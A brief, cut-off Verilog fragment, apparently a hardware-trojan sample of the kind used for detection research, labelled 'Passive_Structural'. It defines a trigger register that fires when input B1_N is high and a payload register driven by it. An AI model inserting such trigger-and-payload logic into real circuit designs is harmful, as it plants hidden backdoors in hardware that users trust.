// HT_START
// Trojan Type: Passive_Structural
reg htrojan_trig;
reg htrojan_pay;
always @(*) begin
    htrojan_trig = (B1_N == 1'b1);
    htrojan_pay = htrojan_trig ? 1'b1 : 1'b0;
